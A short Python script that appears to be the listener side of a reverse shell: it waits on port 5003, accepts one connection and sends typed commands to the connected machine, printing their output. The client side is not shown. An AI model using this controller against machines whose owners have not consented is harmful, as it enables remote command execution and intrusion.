import socket


class Server:
    def __init__(self, server_host, server_port, buffer_size):
        self.server_host = server_host
        self.server_port = server_port
        self.buffer_size = buffer_size
        self.socket = socket.socket()

    def bind(self):
        self.socket.bind((self.server_host, self.server_port))

    def listen(self):
        self.socket.listen(1)
        print(f"Listening as {self.server_host}:{self.server_port}...")

    def accept(self):
        print(f"Waiting for someone to connect...")
        client_socket, client_address = self.socket.accept()
        print(f"{client_address[0]}:{client_address[1]} Connected!\n Starting command line interface...")
        while True:
            command = input("Enter the command you wanna execute:")
            client_socket.send(command.encode())
            if command.lower() == "exit":
                break

            results = client_socket.recv(self.buffer_size).decode()
            print(results)

        client_socket.close()
        self.socket.close()

    def send_message(self, client_socket):
        message = "Hello and Welcome".encode()
        client_socket.send(message)


if __name__ == '__main__':
    server = Server('0.0.0.0', 5003, 1024)
    server.bind()
    server.listen()
    server.accept()
